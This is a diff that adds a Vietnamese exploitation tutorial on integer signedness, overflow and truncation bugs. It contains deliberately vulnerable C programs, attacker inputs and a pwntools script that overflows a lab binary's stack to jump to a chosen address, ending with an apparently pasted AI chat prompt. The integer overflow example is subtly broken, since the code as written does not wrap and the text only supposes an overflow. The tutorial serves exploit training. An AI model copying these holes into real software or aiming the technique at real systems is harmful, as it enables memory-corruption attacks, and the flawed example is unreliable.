@@ -172,6 +172,161 @@ p.sendlineafter(b"new ID value: ", b"1")
 print(p.recvall().decode())
 ```
 
+### 2. Arithmetic Primitives
+
+#### Signedness Bug (Lỗi nhầm lẫn Dấu)
+
+Đây là lỗi xảy ra khi lập trình viên so sánh một số có dấu (signed) với một số không dấu (unsigned), hoặc dùng số có dấu để kiểm tra biên nhưng lại truyền nó vào một hàm nhận số không dấu.
+
+#### Mã nguồn lỗi (Vulnerable Code)
+```c
+// signedness_bug.c
+#include <stdio.h>
+#include <string.h>
+
+void exploit_me() {
+    char buffer[32];
+    int size; // LỖI: Dùng kiểu có dấu (int) thay vì size_t
+
+    printf("Enter size of data to read: ");
+    scanf("%d", &size);
+
+    // Bước kiểm tra biên (Bounds Check)
+    if (size > 32) { 
+        printf("Too big! Max is 32.\n");
+        return;
+    }
+
+    // read(int fd, void *buf, size_t count)
+    // size_t là unsigned long (64-bit)
+    printf("Reading %d bytes...\n", size);
+    read(0, buffer, size); 
+}
+
+int main() { exploit_me(); return 0; }
+```
+
+**Phân tích tầng sâu (Assembly x64)**
+Kẻ tấn công sẽ nhập `size = -1`.
+1.  **Tại câu lệnh `if (size > 32)`:** CPU sử dụng lệnh `jle` hoặc `jg` (so sánh có dấu). Vì `-1 < 32`, chương trình nghĩ rằng đầu vào an toàn và cho đi tiếp.
+2.  **Tại hàm `read`:** Tham số thứ 3 (`count`) yêu cầu kiểu `size_t` (unsigned 64-bit). Khi truyền `-1` (dạng hex là `0xffffffff`) vào thanh ghi `RDX`, CPU sẽ thực hiện **Sign-Extension**.
+    *   Thanh ghi `EDX` (32-bit) là `0xffffffff`.
+    *   Khi mở rộng ra `RDX` (64-bit) để gọi hàm, nó trở thành `0xffffffffffffffff`.
+    *   Hàm `read` sẽ cố gắng đọc **18 tỷ tỷ bytes** vào cái buffer 32 bytes $\rightarrow$ Stack Overflow ngay lập tức.
+
+**Tips and Tricks:** Luôn tìm các biến `int` hoặc `short` được dùng làm tham số kích thước trong `malloc`, `memcpy`, `read`, `recv`.
+
+---
+
+#### Integer Overflow (Tràn số nguyên)
+
+Lỗi này xảy ra khi một phép tính vượt quá giá trị tối đa của kiểu dữ liệu và "quay vòng" về giá trị nhỏ.
+
+#### Mã nguồn lỗi (Vulnerable Code)
+```c
+// integer_overflow.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void manage_items() {
+    unsigned short count;
+    printf("How many items? (max 65535): ");
+    scanf("%hu", &count);
+
+    // Cấp phát bộ nhớ dựa trên số lượng items
+    // Mỗi item nặng 8 bytes (ví dụ: con trỏ)
+    size_t total_size = count * 8; 
+    
+    printf("Allocating %zu bytes for %hu items...\n", total_size, count);
+    long *items = (long *)malloc(total_size);
+
+    if (!items) return;
+
+    // Vòng lặp nạp dữ liệu vào các items
+    for (int i = 0; i < count; i++) {
+        printf("Item %d: ", i);
+        scanf("%ld", &items[i]); // OOB Write xảy ra ở đây
+    }
+}
+```
+
+#### Cơ chế "Bẫy bộ nhớ"
+1.  **Kẻ tấn công nhập `count = 8193`**:
+2.  **Phép tính toán:** `total_size = 8193 * 8 = 65544`.
+3.  Tuy nhiên, nếu `total_size` bị ép vào một kiểu dữ liệu nhỏ hơn hoặc xảy ra tràn ở mức thanh ghi:
+    *   Giả sử một lỗi logic khiến phép tính bị tràn ở mức 16-bit: `65544` sẽ trở thành `65544 % 65536 = 8`.
+4.  `malloc(8)` sẽ cấp phát một vùng nhớ tí hon (chỉ đủ cho 1 item).
+5.  Vòng lặp `for` vẫn chạy tới `8193`. Ngay từ item thứ 2 (`i=1`), bạn đã thực hiện một cú **Heap OOB Write** cực mạnh vào các chunk lân cận.
+
+**Tips and Tricks:** Kiểm tra các phép nhân `count * size` hoặc phép cộng `offset + length`. Nếu không có lệnh kiểm tra tràn (`if (result < count)`), đó là lỗ hổng.
+
+---
+
+####  Integer Truncation (Cắt cụt số nguyên)
+
+Xảy ra khi ép kiểu từ một biến lớn (64-bit) xuống một biến nhỏ (16/32-bit), làm mất các bit cao.
+
+#### Mã nguồn lỗi (Vulnerable Code)
+```c
+// truncation_bug.c
+#include <stdio.h>
+
+void process_data(unsigned long long big_size) {
+    // big_size là 64-bit (ví dụ: kích thước file)
+    unsigned short small_size = (unsigned short)big_size; // LỖI: Cắt cụt
+
+    printf("Big size: %llu, Small size: %hu\n", big_size, small_size);
+
+    if (small_size < 100) {
+        char buf[100];
+        // Sử dụng giá trị gốc big_size để thực hiện ghi dữ liệu
+        // Nhưng logic bảo vệ 'if' lại dựa trên small_size
+        memcpy(buf, "A", big_size); 
+    }
+}
+```
+
+**Phân tích chiến thuật**:
+1.  Kẻ tấn công gửi `big_size = 65537` (`0x10001` trong hex).
+2.  Khi ép kiểu xuống `unsigned short` (16-bit), CPU chỉ lấy 4 số cuối (`0x0001`).
+3.  `small_size` bây giờ bằng `1`.
+4.  Điều kiện `if (1 < 100)` thỏa mãn.
+5.  `memcpy` thực hiện copy **65537 bytes** vào `buf[100]`. Game over.
+
+---
+
+**Mã khai thác minh họa (Python Exploit cho Signedness Bug)**
+
+```python
+from pwn import *
+
+# Mục tiêu: Vượt qua check size > 32 bằng cách nhập số âm
+# Để thực hiện Stack Overflow
+
+io = process('./signedness_bug')
+
+# -1 được hiểu là 0xffffffff (Max Unsigned Int) khi vào hàm read
+payload = b"A" * 72 # Vượt qua buffer (32) + padding + Saved RBP
+payload += p64(0x4011d6) # Địa chỉ hàm win() hoặc địa chỉ ROP Gadget
+
+io.sendlineafter(b"read: ", b"-1") # Bypass check size > 32
+io.sendline(payload)
+
+io.interactive()
+```
+
+### Tổng kết tư duy Săn 0-day với Lỗi Toán Học:
+
+| Loại lỗi | Đặc điểm nhận dạng | Mục tiêu tấn công |
+| :--- | :--- | :--- |
+| **Signedness** | Dùng `int` để check `size`, nhưng dùng `size_t` để copy. | Nhập số âm để bypass check. |
+| **Overflow** | Phép nhân `n * size` không có kiểm tra tràn. | Nhập số lớn để `malloc` ra vùng nhớ siêu nhỏ. |
+| **Truncation** | Ép kiểu (cast) từ `long` sang `int` hoặc `short`. | Nhập số có các bit thấp thỏa mãn điều kiện nhưng giá trị thật rất lớn. |
+
+**Ghi chú quan trọng:** Trong x64, các thanh ghi như `RDI, RSI, RDX` là 64-bit. Khi một lỗi toán học 32-bit xảy ra, hãy quan sát cách CPU mở rộng dấu (**MOVSXD**) hoặc xóa bit cao (**MOV EAX, ...**). Đó là nơi bạn tìm ra "con số kỳ diệu" để kích hoạt OOB.
+
+Bạn đã sẵn sàng để đi sâu hơn vào **Off-by-one** (lỗi lệch 1 byte nhưng bẻ lái cả hệ thống) chưa? Hay bạn muốn tôi giải thích thêm về cách các lỗi toán học này kết hợp với **Heap Feng Shui**?
+
 ---
 
 ### 2. Sự Trộn Lẫn Chết Người Giữa Dữ Liệu và Luồng Điều Khiển
